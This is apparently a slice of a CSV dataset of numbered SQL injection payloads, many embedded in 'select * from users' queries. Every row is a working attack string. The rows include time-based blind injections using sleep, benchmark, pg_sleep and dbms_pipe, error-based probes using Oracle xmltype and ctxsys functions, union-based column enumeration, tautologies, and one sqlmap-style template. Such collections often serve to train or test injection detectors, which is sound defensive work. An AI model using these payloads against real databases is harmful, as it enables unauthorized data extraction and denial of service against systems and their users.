"984","select * from users WHERE username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp"""
"985","select * from users WHERE username = ""-2806\' ) ) ) and ( ( ( \'rxzr\' = \'rxzr"" and username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"986","1"" ) where 7840 = 7840 union all select null,null#"
"987","1"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #"
"988","1%"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"989","1%"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""%"" = """
"990","select * from users WHERE username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-1641\' ) ) or ( ( 5299 = 5299"""
"991","1 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) # jpau"
"992","select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" or username = ""1\'"
"993","or 3 = 3"
"994","1"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #"
"995","select * from users where id = 1 %$ 1 or 1 = 1 -- 1"
"996","select * from users WHERE username = ""-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-4811%\' ) ) and username = ""1\' ) where 1502 = 1502 and ( ( 5616 = 5616"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"997","select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-1641\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"998","-5286' or 6783 = 1233"
"999","1 ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 6786 = 6786"
"1000","1"" ) where 2070 = 2070"
"1001","-6007"" ) ) union all select 6019,6019,6019,6019,6019,6019,6019,6019--"
"1002","select * from users where id = 1 -@<@ union select null,version ( ) -- 1"
"1003","select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-9501\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"1004","select * from users WHERE username = ""-8021\' ) ) and ( ( \'cenk\' like \'cenk"" and username = ""-6353%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1005","-6198"" ) or make_set ( 3602 = 2178,2178 ) and ( ""xksq"" like ""xksq"
"1006","end and 'wdce' = 'wdce"
"1007","1%"" ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1008","1 or benchmark ( 10000000,MD5 ( 1 ) ) #"
"1009","1 ) where 9860 = 9860 and 4443 = 4111--"
"1010","select * from users WHERE username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'itxy\' like \'itxy"""
"1011","select * from users WHERE username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1%\' ) ) )"
"1012","select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""1%\' ) and ( \'%\' = \'"""
"1013","1"" ) union all select null--"
"1014","-5054%"" ) ) ) union all select 8263,8263,8263,8263--"
"1015","select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'fgcg' = 'fgcg"
"1016","1"" ) as hblk where 7982 = 7982 and 9611 = 6142--"
"1017","1 ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 1233 = 1233"
"1018","SELECT * FROM users WHERE username = ""1 where 5161 = 5161 AND username = ""1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1019","select * from users WHERE username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""bwrb"" like ""bwrb"" and username = ""1\' ) ) )"
"1020","1%' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( '%' = '"
"1021","select * from users WHERE username = ""-5152\' ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'jumr\' like \'jumr"" and username = ""1 ) and ( ( \'%\' = \'"""
"1022","1' ) ) as cwss where 9720 = 9720"
"1023","-7851"" ) ) or 6872 = 6872 and ( ( ""dvbw"" like ""dvbw"
"1024","select ( case when ( 9393 = 5530 ) then 9393 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--"
"1025","-3391' union all select 2024,2024--"
"1026","select * from users WHERE username = ""-5152\' ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( \'%\' = \'"""
"1027","select * from users where id = '1' <@.$ or 1 = 1 -- 1'"
"1028","select * from users WHERE username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""bwrb"" like ""bwrb"" or username = ""-2756\' where 6156 = 6156"
"1029","-3954' ) ) union all select 2417,2417--"
"1030","select * from users WHERE username = ""-9688%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""-5863"" and ""gkvy"" = ""gkvy"""
"1031","select * from users WHERE username = ""-5217 where 3620 = 3620 or username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"1032","1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'ybjo' = 'ybjo"
"1033","-7273%' ) ) order by 1#"
"1034","select * from users WHERE username = ""-9505\' ) ) ) or username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-7199\'"
"1035","1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kbkz' = 'kbkz"
"1036","select * from users WHERE username = ""1"" and username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"1037","1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol"
"1038","1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'vrim' = 'vrim"
"1039","select * from users WHERE username = ""1\' and username = ""-1549\' ) or username = ""-9644 ) ) and username = ""1 ) ) as atiy where 3855 = 3855 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"""
"1040","select * from users WHERE username = ""-3859 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 5846 = 5846"" or username = ""-9840\' ) )"
"1041","-1641' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'vgcb' like 'vgcb"
"1042","select * from users WHERE username = ""1\' ) where 2511 = 2511 and username = ""-1190\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'yxry\' like \'yxry"""
"1043","select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1\' ) and username = ""1"""
"1044","1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'miir' like 'miir"
"1045","1"" ) as qirf where 6200 = 6200 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --"
"1046","select * from users WHERE username = ""-5585\' or username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1047","select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-1190\' and username = ""-8860 )"
"1048","select * from users WHERE username = ""-2154%\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-2783%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"1049","select * from users WHERE username = ""-9564 or username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""-6190\' ) where 2621 = 2621 or username = ""-1254"""
"1050","select * from users WHERE username = ""-6353%\' ) ) or username = ""1 ) and ( ( 8254 = 8254"""
"1051","select * from users WHERE username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" and ( ( \'ybgd\' = \'ybgd"" and username = ""1\'"
"1052","AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]') AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')"
"1053","-9588' ) ) union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--"
"1054","1%"" ) and 8024 = 3560--"
"1055","select * from users WHERE username = ""-5352%\' ) ) ) and username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-9564"
"1056","1"" ) ) as czzg where 5483 = 5483 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --"
"1057","-4513"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""gytb"" = ""gytb"
"1058","SELECT * FROM users WHERE username = ""1 where 5161 = 5161 AND username = ""-6190\' ) where 2621 = 2621 || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) || username = ""-8069\' ) )"
"1059","1%"" ) and sleep ( 5 ) and ( ""%"" = """
"1060","select * from users WHERE username = ""1\' or username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1\' )"
"1061","-7444 ) ) ) or 1342 = 9774"
"1062","1%"" ) union all select null,null,null,null--"
"1063","select * from users WHERE username = ""1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-6665\' ) ) )"
"1064","select * from users WHERE username = ""1"" and username = ""1"" and username = ""1 ) where 3381 = 3381 --"""
"1065","select * from users WHERE username = ""1 ) ) ) and ( ( ( 9548 = 9548"" and username = ""-1641\' ) ) and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1066","select * from users WHERE username = ""1 ) and username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'%\' = \'"""
"1067","select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""-6353%\' ) ) and ( ( \'%\' = \'"""
"1068","-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#"
"1069","1 ) ) as bjxd where 4299 = 4299"
"1070","1%"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""%"" = """
"1071","1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 'ohqs' like 'ohqs"
"1072","1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'ckfn' like 'ckfn"
"1073","select * from users WHERE username = ""-3859 ) || username = ""-7072\' ) || username = ""-5062 ) where 7457 = 7457 || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-1254"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 3530 = 3530"""
"1074","select * from users WHERE username = ""1\' ) ) or username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-1254"""
"1075","1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'yxpi' = 'yxpi"
"1076","select * from users WHERE username = ""-9688%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1%\' ) ) and ( ( \'%\' = \'"""
"1077","1'|| ( select 'bifa' where 6077 = 6077 and 4547 = 9301"
"1078","1"" ) ) as svim where 4924 = 4924 and 7932 = 5870"
"1079","select * from users WHERE username = ""-2374 ) and ( 2576 = 2576"" or username = ""-6523"" and username = ""-7242\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
